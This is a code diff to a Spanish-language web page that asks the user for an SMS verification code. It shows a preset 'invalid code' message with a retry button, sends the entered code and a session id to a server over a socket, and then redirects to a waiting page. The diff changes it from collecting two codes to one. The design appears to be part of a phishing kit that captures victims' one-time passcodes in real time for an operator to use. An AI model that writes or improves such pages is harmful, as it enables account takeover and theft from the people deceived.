@@ -82,22 +82,16 @@
 </head>
 <body>
   <div class="screen">
-    <h3>Te enviaremos el código SMS a tu celular y a tu correo</h3>
-    <p>Introduce los dos códigos de verificación que te acabamos de enviar.</p>
+    <h3>Te enviaremos un código SMS a tu celular</h3>
+    <p>Introduce el código de verificación que te acabamos de enviar.</p>
     
-    <!-- Primer campo -->
+    <!-- Campo único -->
     <div class="input-group campo-requerido">
       <div class="icon"><i class="fas fa-key"></i></div>
-      <input type="tel" id="codigo1" placeholder="Código de verificación (SMS)" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
+      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
     </div>
 
-    <!-- Segundo campo -->
-    <div class="input-group campo-requerido">
-      <div class="icon"><i class="fas fa-key"></i></div>
-      <input type="tel" id="codigo2" placeholder="Código de verificación (Email)" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
-    </div>
-
-    <p class="mensaje-error">Códigos inválidos. Por favor, ingrese los dos correctamente.</p>
+    <p class="mensaje-error">Código inválido. Por favor, ingréselo correctamente.</p>
     <button onclick="reintentarCodigo()">Reintentar</button>
   </div>
 
@@ -109,21 +103,20 @@
     socket.emit("reconectar", sessionId);
 
     function reintentarCodigo() {
-      const codigo1 = document.getElementById("codigo1").value;
-      const codigo2 = document.getElementById("codigo2").value;
+      const codigo = document.getElementById("codigo").value;
 
-      if (!codigo1 || !codigo2) {
-        alert("Ambos códigos son obligatorios.");
+      if (!codigo) {
+        alert("El código es obligatorio.");
         return;
       }
 
-      if (!/^\d{6}$/.test(codigo1) || !/^\d{6}$/.test(codigo2)) {
-        alert("Cada código debe tener exactamente 6 dígitos numéricos.");
+      if (!/^\d{6}$/.test(codigo)) {
+        alert("El código debe tener exactamente 6 dígitos numéricos.");
         return;
       }
 
-      // Enviar OTPs ingresados al servidor
-      socket.emit("otpIngresado", { codigo1, codigo2, sessionId });
+      // Enviar OTP ingresado al servidor
+      socket.emit("otpIngresado", { codigo, sessionId });
 
       // Ir a la pantalla de espera
       window.location.href = "opciones.html";
